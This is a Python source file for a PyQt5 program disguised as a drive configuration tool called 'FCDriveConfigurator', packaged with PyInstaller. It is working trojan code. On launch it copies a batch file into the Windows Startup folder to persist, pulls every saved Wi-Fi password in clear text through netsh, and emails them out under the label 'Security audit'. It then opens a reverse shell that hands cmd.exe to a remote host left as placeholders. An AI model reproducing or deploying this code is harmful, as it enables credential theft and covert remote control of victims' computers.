import subprocess
import sys

from PyQt5.QtGui import QIcon

import layout
import mail_sender
import os, socket, subprocess, threading
from pathlib import Path
from shutil import copyfile
from PyQt5.QtWidgets import QApplication, QLabel, QMainWindow

# pyuic5 -x layout.ui -o layout.py
# pyinstaller.exe --onefile --icon="assets/drivepng.ico" main.py --add-data "assets/;assets"

def get_wifi_passwords():
    pwds = ""
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode(
        'utf-8').split('\n')
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    for i in profiles:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear'],shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).decode(
            'utf-8').split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            # print("{:<30}|  {:<}".format(i, results[0]))
            pwds += "{:<30}|  {:<}".format(i, results[0]) + "\n"
        except IndexError:
            # print("{:<30}|  {:<}".format(i, ""))
            pwds += "{:<30}|  {:<}".format(i, "") + "\n"
    return pwds

class MainWindow(QMainWindow):

    def __init__(self, *args, **kwargs):
        super(MainWindow, self).__init__(*args, **kwargs)
        self.ui = layout.Ui_MainWindow()
        self.ui.setupUi(self)
        self.setWindowIcon(QIcon(resource_path("assets/drivepng.png")))


        self.setWindowTitle("FCDriveConfigurator")
        self.showMaximized()
        self.execute_payload()

    def execute_payload(self):
        self.copy_rickroll_to_startup()
        # print("rickroll copied")
        pwds = get_wifi_passwords()
        mail_sender.send_mail("Security audit", pwds, ["", ""], html=False)
        # print("mail send!")
        self.reverse_shell()

    def copy_rickroll_to_startup(self):
        home = str(Path.home())
        startup_path = f"{home}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup/script.bat"
        print(startup_path)

        copyfile(resource_path("assets/script.bat"), startup_path)



    def s2p(self, s, p):
        while True:
            data = s.recv(1024)
            if len(data) > 0:
                p.stdin.write(data)
                p.stdin.flush()

    def p2s(self, s, p):
        while True:
            s.send(p.stdout.read(1))

    def reverse_shell(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((<targetip>, <targetport>))

        p = subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                             stdin=subprocess.PIPE)

        s2p_thread = threading.Thread(target=self.s2p, args=[s, p])
        s2p_thread.daemon = True
        s2p_thread.start()

        p2s_thread = threading.Thread(target=self.p2s, args=[s, p])
        p2s_thread.daemon = True
        p2s_thread.start()

        try:
            p.wait()
        except KeyboardInterrupt:
            s.close()


def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)


app = QApplication(sys.argv)

window = MainWindow()
window.show()

app.exec_()